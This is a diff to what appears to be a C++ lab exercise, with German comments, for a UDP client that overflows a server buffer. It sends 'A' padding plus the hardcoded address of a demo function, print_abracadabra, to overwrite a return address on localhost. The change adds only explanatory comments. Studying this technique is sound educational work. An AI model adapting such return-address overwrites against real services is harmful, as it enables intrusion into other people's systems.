@@ -9,7 +9,10 @@
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 1234
-
+//----------------------------------Übergabeparameter---------------------------------------
+/*
+ * Dem Programm muss die Offset größe übergeben werden.
+ */
 //----------------------------------Szenario------------------------------------------
 /**
  * Dieses Szenario beschreibt die Interaktion zwischen einem UDP-Server und einem Client.
@@ -49,20 +52,21 @@ int main(int, char* argv[])
 
     std::vector<char> payload(PAYLOAD_OFFSET_SIZE + 8);
 
-    std::memset(payload.data(), 'A', PAYLOAD_OFFSET_SIZE);
+    std::memset(payload.data(), 'A', PAYLOAD_OFFSET_SIZE); // Füllt den Payload mit 'A'-Bytes
 
     uintptr_t func_addr = 0x0000000000401246; // Adresse von print_abracadabra
-    *(uintptr_t*)(payload.data() + PAYLOAD_OFFSET_SIZE) = func_addr;
+    *(uintptr_t*)(payload.data() + PAYLOAD_OFFSET_SIZE) =
+        func_addr; // Überschreibt Rücksprungadresse
 
     // Debug-Ausgabe der gesendeten Adresse
     std::cout << "[DEBUG] Vollständiger Payload vor dem Senden:" << std::endl;
     for (size_t i = 0; i < PAYLOAD_OFFSET_SIZE + 8; i++) {
-        std::printf("%02x ", (unsigned char)payload[i]);
+        std::printf("%02x ", (unsigned char)payload[i]); // Hexadezimale Darstellung des Payloads
     }
     std::cout << std::endl;
 
     sendto(sockfd, payload.data(), PAYLOAD_OFFSET_SIZE + 8, 0, (struct sockaddr*)&server_addr,
-           sizeof(server_addr));
+           sizeof(server_addr)); // Sendet die manipulierte Nachricht an den Server
 
     std::cout << "[INFO] Payload gesendet!" << std::endl;
     close(sockfd);
